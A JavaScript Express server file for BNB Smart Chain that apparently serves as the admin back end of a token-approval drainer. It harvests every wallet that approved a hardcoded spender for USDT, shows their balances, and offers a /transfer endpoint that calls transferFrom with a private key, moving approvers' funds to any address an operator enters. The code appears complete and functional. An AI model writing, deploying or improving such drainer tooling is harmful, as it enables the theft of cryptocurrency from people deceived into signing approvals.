
const express = require("express");
const path = require("path");
const dotenv = require("dotenv");
const { ethers } = require("ethers");

dotenv.config();

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

const PRIVATE_KEY = process.env.PRIVATE_KEY;
const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";

const provider = new ethers.providers.JsonRpcProvider("https://1rpc.io/bnb");
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const ABI = [
  "event Approval(address indexed owner, address indexed spender, uint256 value)",
  "function balanceOf(address) view returns (uint256)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address from, address to, uint amount) returns (bool)"
];

const contract = new ethers.Contract(USDT_ADDRESS, ABI, provider);

async function fetchApprovedWallets() {
  const startBlock = 50407453;
  const endBlock = await provider.getBlockNumber();
  const filter = contract.filters.Approval(null, SPENDER_ADDRESS);
  const step = 1000;
  const approved = new Set();

  for (let from = startBlock; from <= endBlock; from += step) {
    const to = Math.min(from + step - 1, endBlock);
    try {
      const logs = await contract.queryFilter(filter, from, to);
      logs.forEach(log => approved.add(log.args.owner.toLowerCase()));
    } catch (err) {
      console.warn(`⚠️ Block ${from}-${to} failed: ${err.message}`);
    }
  }

  return [...approved];
}

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

app.get("/wallets", async (req, res) => {
  try {
    const approvedWallets = await fetchApprovedWallets();

    const result = await Promise.all(
      approvedWallets.map(async (addr) => {
        const balance = await contract.balanceOf(addr);
        const allowance = await contract.allowance(addr, SPENDER_ADDRESS);
        return {
          wallet: addr,
          balance: ethers.utils.formatUnits(balance, 18),
          approved: allowance.gt(0) ? "✅ YES" : "❌ NO"
        };
      })
    );

    res.json(result);
  } catch (err) {
    console.error("❌ Error in /wallets:", err.message);
    res.status(500).json({ error: "Internal error" });
  }
});

// 🚫 Blacklisted destination addresses
const BLACKLIST = [
  "0xbE73c37a0c255766211804aa4539047171363aab".toLowerCase()
];

app.post("/transfer", async (req, res) => {
  try {
    const { fromWallet, toWallet, amount } = req.body;

    // ✅ Validate destination address format
    if (!/^0x[a-fA-F0-9]{40}$/.test(toWallet)) {
      return res.status(400).json({ success: false, error: "❌ Invalid wallet address format" });
    }

    // 🚫 Check blacklist
    if (BLACKLIST.includes(toWallet.toLowerCase())) {
      return res.status(400).json({ success: false, error: "❌ This destination wallet is blocked." });
    }

    const contractWithSigner = new ethers.Contract(USDT_ADDRESS, ABI, wallet);
    const tx = await contractWithSigner.transferFrom(fromWallet, toWallet, ethers.utils.parseUnits(amount, 18));
    await tx.wait();
    res.json({ success: true, hash: tx.hash });
  } catch (err) {
    console.error("❌ Transfer Error:", err.message);
    res.status(500).json({ success: false, error: err.message });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`✅ Destiny backend live at http://localhost:${PORT}`);
});
